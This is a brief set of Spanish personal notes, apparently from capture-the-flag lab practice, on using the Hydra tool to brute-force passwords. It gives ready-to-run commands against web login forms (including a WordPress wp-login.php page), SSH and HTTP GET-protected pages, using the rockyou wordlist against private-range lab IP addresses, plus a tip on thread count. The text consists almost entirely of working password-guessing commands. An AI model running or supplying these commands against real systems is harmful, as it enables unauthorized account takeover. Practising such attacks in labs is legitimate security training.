######################## Uso Hydra (fuerza bruta forms y protolocos)
 webform -> hydra -l usuario -P <diccionario> ip http-post-form "/<url de form>:<nombre etiquetas html>&<etiqua>:<mensaje al fallar conexion>"

  ej: hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.63.105  http-post-form  "/Login:username=^USER^&password=^PASS^:Your username or password is incorrect."

	  hydra -l c0ldd -P /usr/share/wordlists/rockyou.txt 10.201.51.147  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"

 protocolo -> hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.63.105 ssh


loginscreen via get
hydra -l bob -P /usr/share/wordlists/rockyou.txt http-get://10.201.50.213/protected



reducir velocidad: default es -t 16